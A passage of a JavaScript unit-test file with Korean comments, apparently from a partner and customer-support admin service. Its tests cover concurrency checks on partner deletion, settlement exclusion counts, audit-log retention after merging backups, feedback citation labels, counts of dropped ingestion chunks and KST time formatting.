/* ══════════ 디자인 스프린트 — 54차 재감사 (DS 57-1·57-2) ══════════ */

/**
 * DS 57-1 — **지우는 자리에는 동시 편집 관문이 없었다.**
 *
 * DS 56-3 이 파트너·고객사의 저장에 관문을 세웠지만, 같은 탭의 **삭제**는 그 목록에 없었다.
 * 그래서 A 가 옛 목록에서 「제이투모로우원 / 수수료율 10%」를 지울 때, B 가 그 사이 이름을
 * 고치고 수수료율을 15%로 올려 두었더라도 **거절 없이** 지워졌다 — A 가 확인 대화상자에서
 * 읽고 승인한 이름조차 실제로 지워진 것과 달랐다(옛 목록의 이름이다).
 * 되돌릴 수 없는 동작이라 「다음 달 정산에서 드러난다」가 아니고 **그 자리에서 끝난다**.
 *
 * 함께: 지워진 뒤에는 그 파트너의 **이름도 수수료율도** 어디에도 남지 않았다(감사 로그에
 * 식별자만 적혔다). DS 56-1 이 열어 둔 복구 길(「같은 식별자로 다시 등록하기」)에 필요한
 * 값이 하필 그 둘이다 — 그 배선은 `tests/unit.test.mjs` 에서 고정한다.
 */
test('파트너 삭제가 내가 본 모습 위에서만 지운다 (DS 57-1)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const P = await pickPartnerLib('partners');
  const R = await pickPartnerLib('refusal');

  P.resetPartners();
  const made = P.upsertPartner({ name: '제이투모로우원', feeRateBp: 1000 });
  assert.equal(made.ok, true);
  const seen = P.partnerRev(made.partner); // A 가 목록에서 본 모습

  // ── ① 종전 길은 그대로 열어 둔다 — 모습을 보내지 않으면 관문이 없다
  //      (복원·일괄 처리처럼 겨룰 상대가 없는 자리를 막지 않는다 · `upsertPartner` 와 같은 규약).
  const other = P.upsertPartner({ name: '지워질 파트너', feeRateBp: 500 });
  assert.equal(P.deletePartner(other.partner.id).ok, true, '모습 없이 부르는 길이 막혔다 — 종전 계약이 깨졌다');

  // ── ② B 가 그 사이 이름과 수수료율을 고친다. A 의 옛 모습으로는 **지워지지 않는다**.
  const edited = P.upsertPartner({ id: made.partner.id, name: '제이투모로우원(신규계약)', feeRateBp: 1500, baseRev: seen });
  assert.equal(edited.ok, true);
  const stale = P.deletePartner(made.partner.id, { baseRev: seen });
  assert.equal(stale.ok, false, '그 사이 바뀐 파트너를 말없이 지웠다');
  assert.equal(stale.conflict, 'changed');
  assert.equal(stale.error, R.CHANGED_DELETE_TARGET_MESSAGE, '거절 문장이 갈라졌다');
  assert.ok(!stale.error.includes('다시 저장'), '지우는 자리에서 저장을 권한다');
  assert.ok(stale.error.includes('지우지 않았습니다'), '아무것도 지워지지 않았다는 사실을 적지 않는다');
  // 거절은 **아무것도 지우지 않는다** — 그리고 지금 저장된 내용을 돌려준다(무엇을 지울지 보고 고르게).
  assert.equal(P.listPartners().length, 1, '거절했는데 지워졌다');
  assert.equal(stale.current.name, '제이투모로우원(신규계약)', '지금 저장된 이름을 돌려주지 않는다');
  assert.equal(stale.current.feeRateBp, 1500, '지금 저장된 수수료율을 돌려주지 않는다');

  // ── ③ 지금 모습을 들고 오면 지워지고, **지운 그 파트너를 돌려준다**(기록에 적을 값이다).
  const nowRev = P.partnerRev(P.getPartner(made.partner.id));
  const done = P.deletePartner(made.partner.id, { baseRev: nowRev });
  assert.equal(done.ok, true, `지금 모습인데 거절한다: ${done.ok ? '' : done.error}`);
  assert.equal(done.partner.name, '제이투모로우원(신규계약)', '무엇을 지웠는지 돌려주지 않는다');
  assert.equal(done.partner.feeRateBp, 1500, '지운 수수료율을 돌려주지 않는다');
  assert.equal(P.listPartners().length, 0);

  // ── ④ 그 사이 **사라진** 대상에는 다른 말을 한다(저장 쪽과 같은 문장이다).
  const gone = P.deletePartner(made.partner.id, { baseRev: nowRev });
  assert.equal(gone.ok, false);
  assert.equal(gone.conflict, 'gone');
  assert.equal(gone.error, R.STALE_TARGET_MESSAGE);

  // ── ⑤ 연결된 고객사가 있으면 **모습이 맞아도** 종전처럼 거절한다(관문이 그 판정을 가리지 않는다).
  const linked = P.upsertPartner({ name: '연결파트너', feeRateBp: 1000 });
  assert.equal(P.upsertAccount({ name: '붙은고객', partnerId: linked.partner.id, source: 'partner' }).ok, true);
  const blocked = P.deletePartner(linked.partner.id, { baseRev: P.partnerRev(linked.partner) });
  assert.equal(blocked.ok, false, '고객사가 붙은 파트너가 지워졌다');
  assert.equal(blocked.conflict, undefined, '연결 거절은 동시 편집이 아니다');
  assert.match(blocked.error, /연결된 고객사가 1곳/);
  assert.equal(P.listPartners().length, 1, '거절했는데 지워졌다');

  // ── ⑥ 수수료율은 **사람 말로** 적는다(기록·화면에 내부 단위를 적지 않는다 · DS 2-12·29-3).
  assert.equal(P.feeRateWords(1500), '15%');
  assert.equal(P.feeRateWords(1250), '12.5%');
  assert.equal(P.feeRateWords(0), '0%', '0%와 미설정은 다른 사실이다');
  assert.equal(P.feeRateWords(null), '미설정');
  assert.equal(P.feeRateWords(undefined), '미설정');
  for (const v of [1500, 1250, 0, null]) assert.ok(!P.feeRateWords(v).includes('bp'), '내부 단위가 새어 나온다');
  P.resetPartners();
});

/**
 * DS 57-2 — 정산 리포트의 **제외 사유가 사실과 달랐고, 어느 수에도 없는 건이 있었다.**
 *
 * 종전에는 대상이 아닌 귀속 고객사를 한 수로 모아 「아직 계약 상태가 아니거나 계약일이 기간
 * 이후인 n건」이라고 적었다. 해지 고객사에 대해 그 문장은 **사실이 아니다**(해지는 「아직」이
 * 아니다). 그리고 「직접 계약 n건」은 그 밖에는 멀쩡했을 건만 세고 있어서, 검토 중인 직접 계약
 * 고객사는 **어느 문장에도 들어가지 않았다** — 조회 4곳이 대상 0곳 + 제외 2곳으로 끝나고
 * 남은 2곳이 어디로 갔는지 화면에 없었다. 「왜 이 고객사가 빠졌는가」는 정산 분쟁에서 가장
 * 먼저 묻는 것이다.
 */
test('정산 리포트가 빠진 까닭을 사유별로 세고 수를 맞춘다 (DS 57-2)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  delete process.env.PARTNER_DEFAULT_FEE_RATE_BP;
  const P = await pickPartnerLib('partners');
  const S = await pickPartnerLib('settlement');
  const AT = new Date('2026-10-22T10:00:00+09:00');

  P.resetPartners();
  const ptr = P.upsertPartner({ name: 'A파트너', feeRateBp: 1000 });
  const mk = (over) => {
    const r = P.upsertAccount({ source: 'partner', partnerId: ptr.partner.id, ...over });
    assert.equal(r.ok, true, `전제가 깨졌다: ${r.ok ? '' : r.error}`);
    return r.account;
  };
  const normal = mk({ name: '정상고객', status: 'contracted', contractedAt: '2026-05-01', monthlyFeeKrw: 100000 });
  const churn = mk({ name: '해지고객', status: 'contracted', contractedAt: '2026-01-01', monthlyFeeKrw: 100000 });
  mk({ id: churn.id, name: '해지고객', status: 'churned', contractedAt: '2026-01-01', monthlyFeeKrw: 100000 });
  mk({ name: '검토중고객', status: 'prospect' });
  mk({ name: '기간후계약', status: 'contracted', contractedAt: '2026-10-01', monthlyFeeKrw: 100000 });
  mk({ name: '직접검토중', partnerId: '', source: 'direct', status: 'prospect' });
  mk({ name: '직접계약', partnerId: '', source: 'direct', status: 'contracted', contractedAt: '2026-01-01', monthlyFeeKrw: 100000 });
  // 계약 상태인데 계약일이 읽히지 않는 저장분 — 복원으로만 들어오는 모양이다(`upsertAccount` 는 막는다).
  const snap = P.exportPartners();
  snap.accounts.push({ ...snap.accounts[0], id: 'ACC-0099', name: '날짜없는계약', status: 'contracted', contractedAt: '어제' });
  assert.equal(P.importPartners(snap, { persist: false }).ok, true);
  assert.equal(P.getAccount('ACC-0099').contractedAt, undefined, '전제가 깨졌다 — 읽을 수 없는 계약일이 들어왔다');

  const rep = S.buildSettlement({ month: '2026-09', at: AT });
  assert.equal(rep.ok, true);
  const notes = rep.report.notes.join('\n');

  // ── ① 종전 문장이 **사라졌다** — 해지를 「아직 계약 상태가 아니」라고 적지 않는다.
  assert.ok(!notes.includes('아직 계약 상태가 아니거나'), `사실이 아닌 한 덩이 문장이 남아 있다:\n${notes}`);

  // ── ② 사유가 **갈라져** 적힌다. 한 건은 한 사유에만 들어간다.
  assert.ok(notes.includes('지금 해지 상태인 1건'), `해지를 따로 세지 않는다:\n${notes}`);
  assert.ok(notes.includes('아직 계약 상태가 아닌(검토 중) 1건'), `검토 중을 따로 세지 않는다:\n${notes}`);
  assert.ok(notes.includes('계약일이 적혀 있지 않아 1건'), `계약일 없는 건을 따로 세지 않는다:\n${notes}`);
  assert.ok(notes.includes('계약일이 기간 이후인 1건'), `기간 밖을 따로 세지 않는다:\n${notes}`);
  // 직접 계약은 **멀쩡한 건만** 세지 않는다 — 검토 중인 직접 계약도 어딘가에 들어가야 한다.
  assert.ok(notes.includes('직접 계약 2건'), `직접 계약을 덜 센다(검토 중이 빠졌다):\n${notes}`);

  // ── ③ **수가 맞는지** 그 자리에서 확인할 수 있다(조회 = 대상 + 제외).
  const all = P.queryAccounts().length;
  assert.equal(all, 7);
  assert.equal(rep.report.rows.length, 1, '대상이 달라졌다');
  assert.ok(notes.includes(`조회한 고객사 ${all}곳 = 정산 대상 1곳 + 제외 ${all - 1}곳`), `수를 맞춰 보여 주지 않는다:\n${notes}`);

  // ── ④ 산출 자체는 종전 그대로다(사유를 갈랐을 뿐 대상 판정은 바뀌지 않았다).
  assert.equal(rep.report.rows[0].accountId, normal.id);
  assert.equal(rep.report.totals.feeAmountKrw, 10000);
  assert.equal(rep.report.totals.partial, false);
  // 한계 문장(해지일을 적지 않는다)은 **없어지지 않는다** — 판정의 한계는 건수와 별개다.
  assert.ok(notes.includes('해지일을 별도로 기록하지 않으므로'), '판정 한계를 숨겼다');
  // CSV 도 같은 문장을 싣는다(내보낸 파일만 다른 말을 하지 않게).
  const csv = S.settlementToCsv(rep.report);
  for (const n of rep.report.notes) assert.ok(csv.includes(n), `CSV 에 빠진 주석이 있다: ${n}`);

  // ── ⑤ 제외가 하나도 없는 달에도 **수는 맞춰 적는다**(0건을 숨기지 않는다).
  P.resetPartners();
  const only = P.upsertPartner({ name: 'B파트너', feeRateBp: 1000 });
  P.upsertAccount({ name: '정상만', partnerId: only.partner.id, source: 'partner', status: 'contracted', contractedAt: '2026-05-01', monthlyFeeKrw: 100000 });
  const clean = S.buildSettlement({ month: '2026-09', at: AT }).report.notes.join('\n');
  assert.ok(clean.includes('조회한 고객사 1곳 = 정산 대상 1곳 + 제외 0곳'), `수를 적지 않는다:\n${clean}`);
  assert.ok(!clean.includes('제외했습니다'), `없는 제외 사유를 적는다:\n${clean}`);
  P.resetPartners();
});

/* ══════════ 디자인 스프린트 — 55차 재감사 (DS 58-1·58-2·58-3) ══════════ */

/**
 * DS 58-1 — **백업을 합치면 보관 경계가 뒤로 물러, 그 사이 구멍이 「빠진 것 없음」으로 읽혔다.**
 *
 * 48차(DS 48-3)가 복원을 「덮어쓰기」에서 **더하기**로 바꿨다. 그 뒤로 변경 이력은 두 시기를
 * 한꺼번에 들고 있을 수 있다 — 1월에 뜬 백업을 10월에 올리면 「1월 몇 줄 + 10월 몇 줄」이고,
 * 그 사이는 **한 줄도 없다**(그 인스턴스는 그때 돌지 않았거나 콜드 스타트로 비었다).
 * 그런데 합치는 문은 경계(`knownFrom`)를 합친 결과의 가장 오래된 줄로 적었다. 그래서
 *  - 화면: 「보관 중인 5건 중 최근 5건 · **2026-01-01 09:00 이후** · 보관 한도 500건」
 *  - 내려받은 파일: 「2026-01-01 09:00 이후의 기록만 담겨 있습니다 — **그보다 앞선 날**이
 *    비어 있는 것은 기록 없음입니다」
 * 즉 1월부터 10월까지가 **성한 기록**으로 읽혔다. 이 목록은 「누가 무엇을 바꿨는가」의 증거이고,
 * 그 열 달을 「아무 변경이 없었다」로 읽게 두는 것은 §13 의 「없는 수」와 같은 거짓이다.
 */
test('백업을 합쳐도 보관 경계가 뒤로 물러나지 않는다 (DS 58-1)', opts, async () => {
  delete process.env.ADMIN_PERSIST;
  const A = await importLib('audit', ['storage', 'csv', 'kst', 'refusal', 'retention', 'logger', 'monitoring']);
  const notes = (csv) => csv.split('\r\n').filter((l) => l.startsWith('# ') || l.startsWith('"# ')).join('\n');

  // ── ① 지금 들고 있는 것은 10월 한 줄뿐이다(그 앞은 **모른다**).
  A.resetAudit();
  A.logAudit({ action: 'kb.upsert', target: 'KB-새', detail: '수정: 환불 기간', authed: true });
  const boundary = A.auditRetention().knownFrom;
  assert.equal(A.auditRetention().mergedFrom, undefined, '섞인 것이 없는데 섞였다고 말한다');

  // ── ② 1월에 뜬 백업을 올린다 — 더해지지만 **경계는 그대로**다.
  const old = {
    version: 1, savedAt: '2026-01-05T00:00:00.000Z', seq: 2,
    events: [
      { id: 'A-000001', at: '2026-01-01T00:00:00.000Z', action: 'kb.delete', target: 'KB-옛1', detail: '', authed: true },
      { id: 'A-000002', at: '2026-01-05T00:00:00.000Z', action: 'partner.delete', target: 'PTR-0001', detail: '', authed: false },
    ],
  };
  const merged = A.mergeAudit(old);
  assert.equal(merged.added, 2, '합치기가 더하지 않았다(재현 조건이 성립하지 않는다)');
  const span = A.auditRetention();
  assert.equal(span.kept, 3);
  assert.equal(span.knownFrom, boundary, '경계가 뒤로 물러났다 — 그 사이 구멍이 성한 기록으로 읽힌다');
  assert.equal(span.mergedFrom, '2026-01-01T00:00:00.000Z', '경계보다 앞선 줄을 들고 있다는 사실이 없다');

  // ── ③ 내려받은 파일이 **두 사실을 갈라** 말한다(한 문장으로 뭉치면 둘 중 하나가 거짓이 된다).
  const n = notes(A.auditToCsv());
  assert.ok(n.includes('이후의 기록은 빠진 것이 없습니다'), `경계 이후를 말하지 않는다:\n${n}`);
  assert.equal(n.includes('이후의 기록만 담겨 있습니다'), false, `더 오래된 줄을 들고 있는데 「이후만」이라 적는다:\n${n}`);
  assert.ok(n.includes('올린 백업에 적혀 있던 관리 작업만 담겨 있습니다'), `섞인 구간을 말하지 않는다:\n${n}`);
  assert.ok(n.includes('「관리 작업 0건」이 아니라 「기록 없음」'), '빈 구간을 0건으로 읽게 둔다');
  assert.equal(notes(A.auditToCsv()).split('\n').length, 4, '주석 수가 다르다(시각 + 건수 + 경계 + 섞인 구간)');

  // ── ④ **콜드 스타트를 넘겨도** 그 사실이 남는다 — 보관 파일이 경계를 함께 적는다.
  //      (적지 않으면 다음 기동의 `importAudit` 이 가장 오래된 줄을 경계로 짐작해 거짓이 되살아난다.)
  const snap = A.exportAudit();
  assert.equal(snap.knownFrom, boundary, '보관 파일이 경계를 적지 않는다');
  A.importAudit(snap);
  assert.equal(A.auditRetention().knownFrom, boundary, '다시 읽으면 경계가 뒤로 물러난다');
  assert.equal(A.auditRetention().mergedFrom, '2026-01-01T00:00:00.000Z', '다시 읽으면 섞인 사실이 사라진다');

  // ── ⑤ 경계 칸이 없는 **옛 파일**은 종전 그대로다(가장 오래된 줄을 경계로 본다).
  const { knownFrom: _old, ...legacy } = snap;
  A.importAudit(legacy);
  assert.equal(A.auditRetention().knownFrom, '2026-01-01T00:00:00.000Z', '옛 파일의 읽는 방식이 바뀌었다');
  assert.equal(A.auditRetention().mergedFrom, undefined, '한 벌로 들어온 기록을 섞였다고 말한다');

  // ── ⑥ 한도에 걸려 옛 줄이 **버려지면** 그 표시도 함께 사라진다(없는 것을 있다고 말하지 않는다).
  A.resetAudit();
  const after = A.auditRetention().knownFrom;
  A.logAudit({ action: 'kb.upsert', target: 'KB-지금', detail: '', authed: true });
  A.mergeAudit({
    version: 1, savedAt: '2026-01-05T00:00:00.000Z', seq: 600,
    events: Array.from({ length: 520 }, (_, i) => ({
      id: `A-${String(i).padStart(6, '0')}`, at: new Date(Date.UTC(2026, 0, 1) + i * 1000).toISOString(),
      action: 'kb.upsert', target: `K-${i}`, detail: '', authed: true,
    })),
  });
  const trimmed = A.auditRetention();
  assert.equal(trimmed.kept, 500, '한도를 넘겨 들고 있다');
  assert.equal(trimmed.dropped, true, '버린 사실이 남지 않는다');
  assert.ok(trimmed.knownFrom >= after, '경계가 뒤로 물러났다');
  assert.equal(trimmed.mergedFrom, '2026-01-01T00:00:21.000Z', '남아 있는 옛 줄의 자리를 가리키지 않는다');
  A.resetAudit();
  // 섞인 것이 없으면 꼬리 주석은 **종전 두 줄**이다(DS 48-1 이 세운 문장이 그대로다).
  A.logAudit({ action: 'kb.upsert', target: 'KB-1', detail: '', authed: true });
  const plain = notes(A.auditToCsv());
  assert.ok(plain.includes('이후의 기록만 담겨 있습니다'), `섞인 것이 없는데 문장이 바뀌었다:\n${plain}`);
  assert.equal(plain.split('\n').length, 3, '섞인 것이 없는데 주석이 늘었다');
  A.resetAudit();
});

/**
 * DS 58-2 — **복원된 평가가 「근거 없음」으로 세어졌다.**
 *
 * 50차(DS 53-2)는 저장분에 적혀 있던 근거 이름을 복원하지 않기로 했다(그 글이 운영자 화면으로
 * 되살아나는 길을 닫았다 — 그 판단은 그대로 둔다). 자료 id 칸은 43차(DS 43-2)에 생겼으므로,
 * 그보다 앞서 뜬 백업의 평가는 복원 뒤에 **id 도 이름도 없는 모양**이 된다. 집계는 그 모양을
 * 「등록 자료 없이 답한 답변」(`NO_CITATION_LABEL`)으로 읽었고, 대시보드는 그 줄에
 * 「등록된 자료 없이 답한 답변입니다. 위의 「답하지 못한 질문」부터 채워 주세요」라고 적었다 —
 * **근거를 들고 답한 평가**를 근거 없는 답변으로 세고, 운영자를 엉뚱한 일로 보냈다.
 */
test('이름을 되돌리지 못한 평가를 「근거 없음」으로 세지 않는다 (DS 58-2)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const F = await importLib('feedback', ['storage', 'kst', 'refusal', 'logger', 'monitoring']);
  F.resetFeedback();

  // ── ① 43-2 이전에 뜬 저장분 — 근거 이름은 있고 자료 id 는 없다.
  const snap = {
    version: 1, savedAt: '2026-01-05T00:00:00.000Z', seq: 4,
    entries: [
      { id: 'F-000001', sessionHash: 'h1', verdict: 'down', citation: '이음 FAQ 3. 활동 시간', channel: 'web', at: '2026-01-01T00:00:00.000Z' },
      { id: 'F-000002', sessionHash: 'h2', verdict: 'down', citation: '환불 규정', channel: 'web', at: '2026-01-02T00:00:00.000Z' },
      // 근거 없이 답한 평가 — 이쪽은 **정말로** 「근거 없음」이다.
      { id: 'F-000003', sessionHash: 'h3', verdict: 'down', citation: '', channel: 'web', at: '2026-01-03T00:00:00.000Z' },
      // 자료 id 가 있는 평가 — 이름은 지금 KB 에서 붙는다(DS 43-2 그대로).
      { id: 'F-000004', sessionHash: 'h4', verdict: 'down', citation: '배송 안내', kbId: 'kb-3', channel: 'web', at: '2026-01-04T00:00:00.000Z' },
    ],
  };
  assert.equal(F.importFeedback(snap).count, 4);

  // ── ② 세 사실이 **세 줄**로 갈라진다(종전에는 앞의 셋이 「근거 없음」 한 줄이었다).
  const rows = F.feedbackSummary({ 'kb-3': '배송 안내(지금 이름)' }).topDown;
  const by = (c) => rows.find((r) => r.citation === c);
  assert.equal(rows.length, 3, `줄이 갈라지지 않았다: ${JSON.stringify(rows)}`);
  const lost = by(F.UNKNOWN_KB_LABEL);
  assert.ok(lost, `이름을 되돌리지 못한 줄이 없다: ${JSON.stringify(rows)}`);
  assert.equal(lost.down, 2, '근거가 있었던 두 평가를 한 줄로 모으지 않았다');
  assert.equal(lost.citationLost, true, '화면이 「근거 없음」과 가릴 수 있는 표시가 없다');
  assert.equal(lost.kbId, undefined, '없는 자료 id 를 지어낸다');
  assert.equal(by(F.NO_CITATION_LABEL)?.down, 1, '정말로 근거가 없던 평가가 섞였다');
  assert.equal(by('배송 안내(지금 이름)')?.down, 1, '자료 id 로 묶는 길이 바뀌었다');
  assert.notEqual(F.UNKNOWN_KB_LABEL, F.NO_CITATION_LABEL, '두 사실을 같은 말로 적는다');
  assert.notEqual(F.UNKNOWN_KB_LABEL, F.DELETED_KB_LABEL, '지워진 자료와 같은 말로 적는다');

  // ── ③ **이름은 여전히 들고 오지 않는다** (DS 53-2 의 판단을 뒤집지 않는다) —
  //      저장분의 글자가 집계·화면 어디에도 되살아나지 않는다.
  const all = JSON.stringify(F.exportFeedback());
  assert.equal(all.includes('이음 FAQ 3. 활동 시간'), false, '저장분의 글자를 들고 왔다');
  assert.equal(all.includes('환불 규정'), false, '저장분의 글자를 들고 왔다');
  assert.equal(JSON.stringify(rows).includes('환불 규정'), false, '집계가 저장분의 글자를 되살린다');

  // ── ④ 다시 떠서 **다시 복원해도** 그 사실은 남는다(두 번째부터는 이름 없이 표시만 있다).
  F.importFeedback(F.exportFeedback());
  const again = F.feedbackSummary({}).topDown;
  assert.equal(again.find((r) => r.citationLost)?.down, 2, '두 번째 복원에서 사실이 사라진다');
  assert.equal(again.find((r) => r.citation === F.NO_CITATION_LABEL)?.down, 1, '두 번째 복원에서 줄이 섞인다');

  // ── ⑤ 새로 들어오는 평가에는 이 표시가 붙지 않는다 — 창구는 이름과 id 를 **한 쌍으로만** 적는다.
  F.resetFeedback();
  const kb = F.resolveKb('kb-9', { 'kb-9': '요금 안내' });
  const made = F.recordFeedback({ sessionHash: 'h9', verdict: 'down', ...kb });
  assert.equal(made.ok, true);
  assert.equal(made.entry.citationLost, undefined, '지금 들어온 평가에 「되돌리지 못함」을 적는다');
  assert.equal(F.feedbackSummary({ 'kb-9': '요금 안내' }).topDown[0].citationLost, undefined);
  F.resetFeedback();
});

/**
 * DS 58-3 — **업로드한 문서에서 빠진 조각을 세지도 말하지도 않았다.**
 *
 * 검색어를 하나도 뽑지 못한 조각은 후보에서 걸러진다(검색어가 없으면 어떤 질문에도 걸리지
 * 않으므로 거르는 것 자체는 맞다). 그런데 **걸렀다고 말하는 자리가 없었다** — 화면은
 * 「후보 N개」라고만 적고, 운영자는 올린 문서가 통째로 들어간 줄 알았다. 실제로 빠지는 대목은
 * 숫자·기호·한 글자만 있는 표나 첫 제목 앞의 머리글처럼 문서 안에서 눈에 잘 띄는 묶음이고,
 * 그 자리를 물어 온 손님은 영원히 기본 안내를 받는다. 미리보기 번호(`#n`)에 난 구멍이 유일한
 * 단서였고, 그 구멍이 무엇인지는 어디에도 적혀 있지 않았다.
 *
 * 42차(DS 42-3)가 같은 필터 뒤에서 본 것은 **전부 빠진 경우**였다(분해형 한글 — 그때는 거절
 * 문장이 떴고, 그 문장이 사실과 달랐다). 일부만 빠지면 거절 문장조차 뜨지 않는다.
 */
test('업로드한 문서에서 빠진 조각을 세어 돌려준다 (DS 58-3)', opts, async () => {
  const ingest = await importLib('ingest', ['knowledge', 'normalize']);
  const doc = [
    '# 요금 안내',
    '',
    '기본 요금은 월 10만 원입니다. 결제일로부터 30일 단위로 청구됩니다.',
    '',
    '# 표',
    '',
    'A 1',
    'B 2',
    'C 3',
    '',
    '# 환불 규정',
    '',
    '해지 신청일 기준으로 남은 기간을 일 단위로 계산해 환불합니다.',
  ].join('\n');

  // ── ① 종전 식 재현 — 세 조각 중 하나가 **말없이** 사라진다(번호에 구멍만 남는다).
  const plain = ingest.documentToCandidates(doc, { title: '요금 안내', category: '요금' });
  assert.equal(ingest.chunkDocument(doc, {}).length, 3, '재현 조건이 성립하지 않는다 — 조각이 셋이 아니다');
  assert.equal(plain.length, 2, '재현 조건이 성립하지 않는다 — 빠진 조각이 없다');
  assert.deepEqual(plain.map((c) => c.chunkIndex), [1, 3], '빠진 번호가 2번이 아니다');

  // ── ② 이제 **빠진 것을 세어 돌려준다** — 무엇이 빠졌는지 찾을 단서까지.
  const r = ingest.ingestDocument(doc, { title: '요금 안내', category: '요금' });
  assert.equal(r.chunks, 3, '나눈 조각 수를 말하지 않는다');
  assert.deepEqual(r.candidates.map((c) => c.chunkIndex), [1, 3], '후보가 달라졌다');
  assert.equal(r.dropped.length, 1, '빠진 조각을 세지 않는다');
  assert.equal(r.dropped[0].index, 2, '빠진 번호가 미리보기 번호와 다르다');
  assert.equal(r.dropped[0].heading, '표', '어느 대목인지 말하지 않는다');
  assert.equal(r.dropped[0].chars, 11);
  assert.equal(r.dropped[0].head, 'A 1 B 2 C 3', '제목 없는 조각의 단서가 될 글자를 싣지 않는다');
  // 거르는 규칙은 **한 벌**이다 — 세는 수와 거르는 수가 어긋나면 안 된다.
  assert.deepEqual(ingest.documentToCandidates(doc, { title: '요금 안내', category: '요금' }), r.candidates);
  assert.equal(r.candidates.length + r.dropped.length, r.chunks, '센 수가 나눈 조각 수와 맞지 않는다');

  // ── ③ **첫 제목 앞의 머리글**도 같은 자리에서 빠진다(제목이 없어 단서가 본문뿐이다).
  const lead = ingest.ingestDocument(['A 1', 'B 2', '', '# 요금 안내', '', '기본 요금은 월 10만 원입니다.'].join('\n'), {
    title: '요금 안내', category: '요금',
  });
  assert.equal(lead.dropped.length, 1);
  assert.equal(lead.dropped[0].heading, '', '없는 제목을 지어낸다');
  assert.equal(lead.dropped[0].head, 'A 1 B 2');
  assert.equal(lead.candidates.length, 1);

  // ── ④ 빠진 것이 없으면 **빈 목록**이다(없는 경고를 띄우지 않는다).
  const clean = ingest.ingestDocument(['# 요금 안내', '', '기본 요금은 월 10만 원입니다. 결제일로부터 청구됩니다.'].join('\n'), {
    title: '요금 안내', category: '요금',
  });
  assert.deepEqual(clean.dropped, []);
  assert.equal(clean.chunks, 1);
  assert.equal(clean.candidates.length, 1);

  // ── ⑤ 본문 전체를 싣지는 않는다 — 찾는 데 필요한 만큼(40자)만이다.
  //    꼬리 표시까지 **40자**다 (DS 62-2) — 종전에는 이 자리만 41자였고(`slice(0, 40)` + `…`),
  //    대표 질문을 만드는 자리는 40자(`slice(0, 39)` + `…`)였다. 주석에는 둘 다 「40자」였다.
  const long = ingest.ingestDocument(`# 표\n\n${Array.from({ length: 60 }, (_, i) => String(i % 10)).join(' ')}`, {
    title: '표', category: '문서',
  });
  assert.equal(long.dropped.length, 1, '재현 조건이 성립하지 않는다');
  assert.equal(long.dropped[0].head.length, ingest.DOC_HEAD_LEN, '꼬리 표시까지 40자가 아니다');
  assert.ok(long.dropped[0].head.endsWith('…'), '줄였으면 줄였다고 말하지 않는다');
  assert.ok(long.dropped[0].chars > ingest.DOC_HEAD_LEN, '재현 조건이 성립하지 않는다 — 본문이 짧다');
});

/* ══════════ 60순위 — 백로그 소진 후 57차 재감사 (DS 60-1·60-3) ══════════ */

/**
 * DS 60-1 — **화면에 적는 시각**은 파일·타임라인과 같은 시계·같은 글자여야 한다.
 *
 * 종전 모습: 콘솔의 `timeLabel` 은 `toLocaleString('ko-KR', …)` 이라 **브라우저가 켜 둔
 * 시간대**로 적었고, 연도가 없었고, 「오전/오후」를 런타임의 CLDR 판본에 맡겼다(돌려서 본 값:
 * `2026-10-22T16:00Z` → 화면 「10. 22. PM 04:00」 / 타임라인 「2026-10-23」 / 파일
 * 「2026-10-23 01:00:00」). 여기서는 그 자리를 대신할 lib 쪽 단일 출처(`kstMinute`)가
 * **초만 뗀 `kstDateTime`** 인지 본다 — 화면 쪽 사본과의 대조는 `tests/console.test.mjs` 다.
 */
test('화면에 적는 시각이 파일의 시각과 같은 글자다 (DS 60-1)', opts, async () => {
  const K = await importLib('kst', []);

  // ── ① 한국 시간이다 — 프로세스 시간대와 무관하다.
  assert.equal(K.kstMinute('2026-10-22T16:00:00.000Z'), '2026-10-23 01:00');
  assert.equal(K.kstMinute('2026-01-01T00:00:00.000Z'), '2026-01-01 09:00');
  // 해를 넘기는 자리 — 연도를 적지 않으면 「12. 31.」과 「1. 1.」이 순서가 거꾸로 보인다.
  assert.equal(K.kstMinute('2025-12-31T16:30:00.000Z'), '2026-01-01 01:30');

  // ── ② 파일의 시각 칸과 **초만 다르다**(같은 건인지 나란히 두고 가릴 수 있어야 한다).
  for (const iso of ['2026-10-22T16:00:00.000Z', '2026-01-01T00:00:00.000Z', '2026-07-04T23:59:59.000Z']) {
    assert.equal(K.kstMinute(iso), K.kstDateTime(iso).slice(0, 16), `파일과 글자가 다르다: ${iso}`);
    assert.equal(K.kstMinute(iso).length, 16);
  }

  // ── ③ 영문이 섞이지 않는다(런타임 CLDR 에 맡기지 않는다 — ICU 78 의 ko 축약형은 「AM」이다).
  for (let h = 0; h < 24; h += 1) {
    const s = K.kstMinute(new Date(Date.UTC(2026, 2, 1, h, 7)));
    assert.equal(/[A-Za-z]/.test(s), false, `영문이 섞였다: ${s}`);
    assert.match(s, /^\d{4}-\d{2}-\d{2} \d{2}:\d{2}$/, `모양이 다르다: ${s}`);
  }

  // ── ④ 읽을 수 없는 값에는 **지어내지 않는다**(`kstDateTime` 과 같은 규칙).
  for (const bad of ['', '어제', 'not-a-date', undefined, {}]) {
    assert.equal(K.kstMinute(bad), '', `읽을 수 없는 값에 시각을 지어냈다: ${String(bad)}`);
  }
  // 받아들이는 값의 경계는 **파일 쪽과 한 벌**이다 — 어느 한쪽만 받아 주면 둘이 또 갈라진다.
  // (`new Date(null)` 은 유효한 값이어서 둘 다 1970년을 적는다 — 종전 `kstDateTime` 의 계약 그대로다.)
  for (const v of ['', '어제', 'not-a-date', undefined, {}, null, 0, '2026-10-22T16:00:00.000Z']) {
    assert.equal(K.kstMinute(v), K.kstDateTime(v).slice(0, 16), `받아들이는 경계가 파일과 다르다: ${String(v)}`);
  }

  // ── ⑤ 화면이 제 시각 기준을 말하는 한 줄이 있고, 파일 꼬리와 **같은 기준**을 말한다.
  assert.equal(K.KST_SCREEN_NOTE, '시각은 한국 시간(KST, UTC+9) 기준입니다.');
  assert.ok(K.KST_CSV_NOTE.startsWith('시각은 한국 시간(KST, UTC+9) 기준입니다.'), '파일과 화면이 다른 기준을 말한다');
});

/**
 * DS 60-3 — 같은 수를 **창구마다 다른 자**로 적지 않는다.
 *
 * 종전 모습: 카카오는 천 단위 쉼표를 손으로 넣으면서 「`toLocaleString` 은 런타임의 ICU 설치에
 * 따라 「2000」이 되기도 한다」고 적어 두었는데, 같은 상한을 알리는 웹 거절 문장과 파트너
